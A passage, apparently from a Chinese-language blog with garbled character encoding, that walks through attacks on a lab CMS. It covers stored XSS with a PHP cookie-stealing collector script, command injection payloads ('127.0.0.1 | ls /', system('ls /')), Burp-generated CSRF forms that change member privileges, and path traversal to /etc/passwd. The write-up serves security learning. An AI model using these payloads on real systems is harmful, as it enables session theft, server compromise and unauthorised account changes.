title="8.XSSï¼ˆ2ä¸ªï¼‰"></a>8.XSSï¼ˆ2ä¸ªï¼‰</h2><h3 id="æ¼æ´ç‚¹ä¸€-2"><a href="#æ¼æ´ç‚¹ä¸€-2" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a>æ¼æ´ç‚¹ä¸€</h3><p>ç™»å½•ç®¡ç†å‘˜è´¦å·åå¯ä»¥å‘é€çŸ­æ¶ˆæ¯ç»™ç”¨æˆ·</p><p>åœ¨ä¹‹å‰çš„sqlæ³¨å…¥æ¼æ´é‡Œï¼Œæˆ‘ä»¬å¯ä»¥è·å–<code>yzn_member</code>è¡¨ä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè™½ç„¶å¯ä»¥è·å–å¯†ç ï¼Œä½†æ˜¯å› ä¸ºæ˜¯md5å€¼ï¼Œå¹¶ä¸”æ˜¯åŠ ç›åçš„md5å€¼ï¼Œç ´è§£çš„éš¾åº¦å¾ˆé«˜ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨è·å–cookieçš„æ–¹å¼æ”»å‡»ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212238672.png" alt="image-20210322212238672" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212821313.png" alt="image-20210322212821313" style="zoom: 67%;"></p><p>ä»ä¸­å¯ä»¥çœ‹åˆ°ç”¨æˆ·ç™»å½•çš„æ—¶é—´ï¼Œä»è€Œå¯ä»¥åˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯å¦åœ¨çº¿ï¼Œæˆ‘ä»¬é€‰æ‹©é‚£äº›åœ¨çº¿çš„ç”¨æˆ·ï¼Œè·å–å…¶æµè§ˆå™¨çš„cookieï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°å¯†ç ç™»å½•å…¶è´¦å·ã€‚</p><p>å°è¯•å‘ç”¨æˆ·<code>szy</code>å‘é€å¸¦æœ‰æ¶æ„è„šæœ¬çš„çŸ­æ¶ˆæ¯ï¼Œå†…å®¹å¦‚ä¸‹</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151141271.png" alt="image-20210323151141271"></p><p>å‘é€å®Œåï¼Œæµè§ˆå™¨å¼¹å‡º<code>xss</code>ï¼Œå¹¶ä¸”æ¯æ¬¡åˆ·æ–°éƒ½ä¼šå‡ºç°å¼¹çª—ï¼Œè¯´æ˜æ˜¯å­˜å‚¨å‹XSSã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151240397.png" alt="image-20210323151240397"></p><p>å½“ç”¨æˆ·ç‚¹å¼€æ”¶ä»¶ç®±æ—¶ï¼Œæµè§ˆå™¨ä¹Ÿä¼šå‡ºç°å¼¹çª—ï¼Œè¯´æ˜æ¼æ´åˆ©ç”¨æˆ</p><p>==å°è¯•è·å–ç”¨æˆ·cookie(å¤±è´¥)==</p><p>é¦–å…ˆåœ¨æœåŠ¡å™¨ä¸Šå†™ä¸€ä¸ªè·å–cookieçš„è„šæœ¬ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå°±æ˜¯è·å–cookieå‚æ•°ï¼Œç„¶åå°†å…¶å†™å…¥cookie.txtä¸­ï¼Œå¹¶è®°å½•å†™å…¥çš„æ—¶é—´ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<span class="hljs-variable">$ip</span> = getenv (<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>);<span class="hljs-variable">$time</span> = date(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);<span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;IP: &quot;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;Date: &quot;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&quot; Cookie:&quot;</span>.<span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);fclose(<span class="hljs-variable">$fp</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>ç„¶åå‘ç”¨æˆ·å‘é€å¸¦æœ‰æ¶æ„è„šæœ¬çš„æ¶ˆæ¯ï¼Œ<code>192.168.164.1</code>ä¸ºæœåŠ¡å™¨çš„ipåœ°å€ï¼Œè¿™é‡Œå°±ä½¿ç”¨äº†è‡ªå·±çš„æœ¬æœºåœ°å€ï¼Œè€Œåœ¨ç°å®çš„æ¸—é€æµ‹è¯•ä¸­æ˜¯éœ€è¦é€‰æ‹©èƒ½å¤Ÿä¸å…¬ç½‘é€šä¿¡çš„æœåŠ¡å™¨æˆ–è€…vpsã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153154260.png" alt="image-20210323153154260" style="zoom:67%;"><p>å½“ç”¨æˆ·ç‚¹å¼€æ”¶ä»¶ç®±åï¼Œè¿™ä¸ªè„šæœ¬å°±ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œå°±å¯ä»¥å°†cookieå†™å…¥åˆ°æœåŠ¡å™¨ä¸Šçš„cookie.txtã€‚</p><p>æŸ¥çœ‹cookie.txt è·å–çš„cookie</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153009193.png" alt="image-20210323153009193"></p><p>ä½†æ˜¯å¯ä»¥å‘ç°è¿™é‡Œçš„cookieå¥½åƒå¹¶ä¸å®Œæ•´ï¼Œçœ‹äº†ä¸€ä¸‹åŸæ¥æ˜¯PHPsessionå€¼é‚£é‡Œè®¾ç½®äº†http-onlyï¼Œè€Œhttp-onlyå°±æ˜¯é˜²æ­¢é€šè¿‡jsè„šæœ¬è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»ï¼Œçªƒå–cookieå†…å®¹ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408154117932.png" alt="image-20210408154117932" style="zoom:67%;"><h3 id="æ¼æ´ç‚¹äºŒ-2"><a href="#æ¼æ´ç‚¹äºŒ-2" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><p>ç™»å½•åçš„ç”¨æˆ·å¯ä»¥åœ¨ç•™è¨€æ¿è¿›è¡Œç•™è¨€ï¼Œç•™è¨€åä¼šæ˜¾ç¤ºè¿‘æœŸçš„ç•™è¨€ä¿¡æ¯</p><p>url <a href="http://192.168.164.147/member/index/comment.html">http://192.168.164.147/member/index/comment.html</a></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223132548.png" alt="image-20210419223132548"></p><p>åœ¨ç•™è¨€ä¸­æ’å…¥æ¶æ„è„šæœ¬ï¼Œæ­¤æ—¶æ•°æ®ä¼šè¢«æäº¤åˆ°æœåŠ¡å™¨å¤„ç†ï¼Œå¹¶å†™å…¥æ•°æ®åº“ï¼Œæ˜¾ç¤ºè¿‘æœŸçš„ç•™è¨€ï¼Œæ­¤æ—¶æ¶æ„è„šæœ¬è¢«æ‰§è¡Œï¼Œé€ æˆäº†XSSæ¼æ´</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223319706.png" alt="image-20210419223319706"></p><p>å¯ä»¥çœ‹å¤§æ¶æ„è„šæœ¬è¢«æµè§ˆå™¨æ‰§è¡Œï¼ŒåµŒå…¥åˆ°htmlé¡µé¢ä¸­</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223406331.png" alt="image-20210419223406331" style="zoom: 67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223500074.png" alt="image-20210419223500074" style="zoom:67%;"></p><h2 id="9-RCEï¼ˆ2ä¸ªï¼‰"><a href="#9-RCEï¼ˆ2ä¸ªï¼‰" class="headerlink" title="9.RCEï¼ˆ2ä¸ªï¼‰"></a>9.RCEï¼ˆ2ä¸ªï¼‰</h2><h3 id="æ¼æ´ç‚¹ä¸€-3"><a href="#æ¼æ´ç‚¹ä¸€-3" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a>æ¼æ´ç‚¹ä¸€</h3><p>åå°ç®¡ç†ä¸­å­˜åœ¨ä¸€ä¸ªé‡‡é›†æ¨¡å—ï¼Œå…¶ä¸­å­˜åœ¨äºä¸€ä¸ªâ€œphpinfoâ€ï¼Œç‚¹å‡»å³å¯æŸ¥çœ‹åˆ°phpinfoä¿¡æ¯</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165611927.png" alt="image-20210413165611927"></p><p>è¿™é‡Œçœ‹ä¼¼æ²¡æœ‰æäº¤å‚æ•°ä½ç½®ï¼Œè®©äººè§‰å¾—æ— ä»ä¸‹æ‰‹ï¼Œåœ¨å‰ç«¯æŸ¥çœ‹æºç å³å¯å‘ç°ï¼Œæ˜¯å°†è¾“å…¥æ¡†éšè—äº†ï¼Œæ‰æ— æ³•çœ‹è§ï¼Œè¾“å…¥çš„å†…å®¹ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170143896.png" alt="image-20210413170143896"></p><p>æŠ“åŒ…å°±å¯ä»¥å‘ç°ç«¯å€ªï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªpostæ–¹å¼æäº¤äº†ä¸€ä¸ªdataå‚æ•°</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165919019.png" alt="image-20210413165919019"></p><p>æäº¤çš„å†…å®¹ä¸º</p><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=phpinfo()</span></code></pre><p>ç„¶åå°±è¿”å›äº†phpçš„å„é¡¹ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯æ‰§è¡Œäº†phpinfoè¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯ç”¨åˆ°äº†eval()å‡½æ•°ï¼Œå°è¯•è¾“å…¥</p><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=system(&#x27;<span class="hljs-title">ls</span> /&#x27;)</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170755721.png" alt="image-20210413170755721" style="zoom:67%;"><p>åˆ©ç”¨æˆåŠŸã€‚</p><h3 id="æ¼æ´ç‚¹äºŒ-3"><a href="#æ¼æ´ç‚¹äºŒ-3" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><p>åå°ç®¡ç†ä¸­å­˜åœ¨ä¸€ä¸ªé‡‡é›†æ¨¡å—ï¼Œå…¶ä¸­å­˜åœ¨äºä¸€ä¸ªâ€œæŸ¥çœ‹å†…ç½‘ä¸»æœºâ€ï¼Œå¯ä»¥æŸ¥çœ‹å†…ç½‘ä¸­çš„ä¸»æœºæ˜¯å¦åœ¨çº¿ã€‚æŸ¥çœ‹ä¸€ä¸ªä¸»æœºæ˜¯å¦åœ¨çº¿æœ€å¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨<code>ping</code>å‘½ä»¤ï¼Œè¿˜è¦ç»“åˆphpä¸­çš„<code>shell_exec()</code>å‡½æ•°ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323155906491.png" alt="image-20210323155906491"></p><p>å°è¯•ä½¿ç”¨ç®¡é“ç¬¦æ‹¼æ¥å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚</p><p>payload:</p><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> | ls /</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413171011227.png" alt="image-20210413171011227"></p><p>å¯ä»¥çœ‹åˆ°åˆ—å‡ºäº†æ ¹ç›®å½•çš„æ–‡ä»¶å¤¹ï¼Œè¯´æ˜å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p><h2 id="10-CSRFï¼ˆ4ä¸ªï¼‰"><a href="#10-CSRFï¼ˆ4ä¸ªï¼‰" class="headerlink" title="10.CSRFï¼ˆ4ä¸ªï¼‰"></a>10.CSRFï¼ˆ4ä¸ªï¼‰</h2><h3 id="æ¼æ´ç‚¹ä¸€-4"><a href="#æ¼æ´ç‚¹ä¸€-4" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a>æ¼æ´ç‚¹ä¸€</h3><p>ç”¨æˆ·ä¸»é¡µé¢â€“&gt;ç§¯åˆ†èµ é€</p><p>è¾“å…¥ç”¨æˆ·åå’Œè¦èµ é€ç§¯åˆ†çš„æ•°é‡å³å¯èµ é€è‡ªå·±çš„ç§¯åˆ†</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423171711582.png" alt="image-20210423171711582" style="zoom:50%;"><p>å½“æˆ‘ä»¬é€šè¿‡æŸ¥æ‰¾ç”¨æˆ·é‚®ç®±åŠŸèƒ½è·å–åˆ°æŸä¸ªç”¨æˆ·çš„é‚®ç®±æ—¶ï¼Œå°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªç±»ä¼¼äºä¸‹å›¾çš„ç½‘é¡µï¼Œç”Ÿæˆé“¾æ¥åé€šè¿‡é‚®ç®±å‘ç»™å—å®³è€…ç„¶åè¯±ä½¿å…¶ç‚¹å‡»é“¾æ¥ï¼Œå°±èƒ½ç¥ä¸çŸ¥é¬¼ä¸è§‰çš„å°†å…¶ç§¯åˆ†è½¬åˆ°è‡ªå·±çš„è´¦å·ä¸‹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423170700922.png" alt="image-20210423170700922" style="zoom:50%;"><h3 id="æ¼æ´ç‚¹äºŒ-4"><a href="#æ¼æ´ç‚¹äºŒ-4" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><p>åå°ç®¡ç†ä¸­ï¼Œå­˜åœ¨ä¼šå‘˜ç®¡ç†æ¨¡å—â€“&gt;ç‚¹å‡»ç¼–è¾‘ï¼Œåœ¨è¿™é‡Œç®¡ç†å‘˜å¯ä»¥æ”¹å˜ä¼šå‘˜çš„ç­‰çº§ï¼Œç§¯åˆ†å’Œå¯†ç ç­‰ã€‚ç„¶è€Œå¦‚æœæ”»å‡»è€…è·å–äº†æ›´æ”¹ç”¨æˆ·ç­‰çº§çš„è¡¨å•å°±å¯ä»¥ç²¾å¿ƒæ„é€ å‡ºä¸€ä¸ªç½‘é¡µï¼ˆburpå¯ä»¥ä¸€é”®ç”Ÿæˆï¼‰ï¼Œè¿™ä¸ªç½‘é¡µçš„åŠŸèƒ½å¯ä»¥å°†ä¼šå‘˜ä¿®æ”¹ä¸ºæ”»å‡»è€…æƒ³è¦çš„ç­‰çº§ï¼Œæˆ–è€…æ˜¯æ·»åŠ ç®¡ç†å‘˜ã€‚æ­¤æ—¶å¦‚æœç®¡ç†å‘˜ä¸å°å¿ƒç‚¹å‡»äº†è¿™ä¸ªé“¾æ¥ï¼Œæµè§ˆå™¨å¸¦ç€ç®¡ç†å‘˜ç™»å½•æ—¶çš„<code>cookie</code>è®¿é—®äº†è¯¥é“¾æ¥ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±è®¤ä¸ºä¿®æ”¹ä¼šå‘˜ç­‰çº§çš„æ“ä½œæ˜¯ç®¡ç†å‘˜æœ¬äººï¼Œæ‰§è¡Œè¯¥æ“ä½œï¼Œä»è€Œé€ æˆæ”»å‡»ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153533206.png" alt="image-20210408153533206" style="zoom: 50%;"><p>ä½¿ç”¨bpæŠ“å–è¯¥è¡¨å•</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162252486.png" alt="image-20210323162252486" style="zoom: 50%;"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=szy&amp;nickname=szy&amp;mobile=<span class="hljs-number">17856276754</span>&amp;email=<span class="hljs-number">263233</span>%<span class="hljs-number">40</span>qq.com&amp;password=&amp;groupid=<span class="hljs-number">2</span>&amp;point=<span class="hljs-number">0</span>&amp;vip=<span class="hljs-number">0</span>&amp;overduedate=<span class="hljs-number">1970</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span>+<span class="hljs-number">08</span>%<span class="hljs-number">3</span>A<span class="hljs-number">00</span>%<span class="hljs-number">3</span>A<span class="hljs-number">00</span>&amp;id=<span class="hljs-number">1</span></code></pre><p>æäº¤çš„æ•°æ®ä¸­å¯ä»¥ä¿®æ”¹<code>groupid, point, vip</code></p><p>ä½¿ç”¨bpä¸€é”®ç”Ÿæˆæ”»å‡»ç½‘é¡µ</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162450984.png" alt="image-20210323162450984"></p><p>ç”Ÿæˆçš„å†…å®¹ä¸º</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/member/member/edit.html?id=1&amp;dialog=1&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mobile&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;17856276754&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;263233<span class="hljs-symbol">&amp;#64;</span>qq<span class="hljs-symbol">&amp;#46;</span>com&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;groupid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;point&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;overduedate&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1970<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#32;</span>08<span class="hljs-symbol">&amp;#58;</span>00<span class="hljs-symbol">&amp;#58;</span>00&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162711313.png" alt="image-20210323162711313" style="zoom:50%;"><p>å¤åˆ¶ä¸Šé¢çš„é“¾æ¥ï¼Œä½¿ç”¨ç¤¾å·¥çš„æ–¹æ³•å‘é€ç»™adminï¼Œå¦‚æœä»–åœ¨å¤„äºç™»å½•çŠ¶æ€æ—¶ç‚¹å‡»é‚£ä¹ˆæ”»å‡»å°±æˆåŠŸäº†ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161709510.png" alt="image-20210406161709510"></p><p>ç‚¹å‡»<code>Submit request</code>ï¼Œå°±ä¼šå‡ºç°æ›´æ–°æˆåŠŸçš„æç¤ºã€‚æŸ¥çœ‹<code>szy</code>ï¼Œç¡®è®¤å…¶ç­‰çº§å˜åŒ–</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323163057847.png" alt="image-20210323163057847" style="zoom: 50%;"><p>å¯ä»¥çœ‹åˆ°è¯¥ç”¨æˆ·çš„ç­‰çº§å·²ç»å˜æˆäº†é«˜çº§ä¼šå‘˜ï¼Œå¹¶ä¸”ç§¯åˆ†ç‚¹æ•°ä¹Ÿå˜æˆäº†1000ï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸã€‚</p><h3 id="æ¼æ´ç‚¹ä¸‰-2"><a href="#æ¼æ´ç‚¹ä¸‰-2" class="headerlink" title="æ¼æ´ç‚¹ä¸‰"></a>æ¼æ´ç‚¹ä¸‰</h3><p>åŒæ ·æ˜¯åœ¨è¿™ä¸ªé¡µé¢ï¼Œæœ‰ä¸€ä¸ªâ€æ·»åŠ â€é¡µé¢ï¼ŒåŒæ ·ä¹Ÿæ˜¯å­˜åœ¨CSRFæ¼æ´ï¼Œå¦‚æœè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œåˆ™å¯ä»¥åˆ›é€ å‡ºå¤§é‡çš„æ— ç”¨è´¦å·ï¼Œä»è€Œæµªè´¹æœåŠ¡å™¨çš„èµ„æºï¼Œå¯èƒ½é€ æˆdosæ”»å‡»ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153639002.png" alt="image-20210408153639002" style="zoom: 33%;"><h3 id="æ¼æ´ç‚¹å››-1"><a href="#æ¼æ´ç‚¹å››-1" class="headerlink" title="æ¼æ´ç‚¹å››"></a>æ¼æ´ç‚¹å››</h3><p>å†…å®¹-&gt;ç¨¿ä»¶ç®¡ç†-&gt;é€šè¿‡å®¡æ ¸ï¼Œè¿™é‡Œä¼šæ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·æäº¤çš„ç¨¿ä»¶ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æäº¤äº†ä¸€ä¸ªå«æœ‰æ¶æ„ä»£ç çš„ç¨¿ä»¶ï¼Œåˆæƒ³åœ¨adminä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è®©è¿™ä¸ªç¨¿ä»¶é€šè¿‡å®¡æ ¸ï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„é“¾æ¥å‘é€ç»™adminï¼Œ</p><p>å†…å®¹å¦‚ä¸‹</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/cms/publish/pass.html&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ids<span class="hljs-symbol">&amp;#91;</span><span class="hljs-symbol">&amp;#93;</span>&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>å½“adminç‚¹å‡»åï¼Œå°±ä¼šè®©ç¨¿ä»¶é€šè¿‡å®¡æ ¸</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224904297.png" alt="image-20210419224904297" style="zoom: 33%;"><h2 id="11-ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#11-ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="11.ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>11.ä»»æ„æ–‡ä»¶ä¸‹è½½</h2><p>é¦–é¡µä¸­å­˜åœ¨ä¸€ä¸ªå›¾ç‰‡ä¸‹è½½æ¨¡å—ï¼Œå¯ä»¥ä¸‹è½½è‡ªå·±å–œæ¬¢çš„çƒæ˜Ÿå£çº¸</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144023954.png" alt="image-20210428144023954" style="zoom:50%;"><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‹¦æˆªè¯·æ±‚ï¼Œä¿®æ”¹æäº¤çš„æ•°æ®</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144326701.png" alt="image-20210428144326701"></p><p>å°è¯•ä¸‹è½½<code>/etc/passwd</code>æ–‡ä»¶ï¼Œè¾“å…¥</p><pre><code class="hljs arcade">filename=<span class="hljs-regexp">/etc/</span>passwd</code></pre><p>ä½†æ˜¯å‡ºç°æç¤º<code>æ–‡ä»¶ä¸å­˜åœ¨ï¼</code></p><p>å°è¯•å¤šè¾“å…¥å‡ ä¸ª<code>../</code></p><pre><code class="hljs awk">filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144637060.png" alt="image-20210428144637060" style="zoom:50%;"><p>æˆåŠŸè·å–åˆ°<code>/etc/passwd</code>æ–‡ä»¶å†…å®¹</p><p>é‚£ä¹ˆå°±å¯ä»¥ç»“åˆRCEæ¼æ´ï¼Œè·å–åˆ°è¯¥æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶</p><p>é¦–å…ˆåˆ©ç”¨RCEæ¼æ´è·å–åˆ°æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œä¹‹åé…åˆè¯¥æ¼æ´å³å¯å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚</p><h2 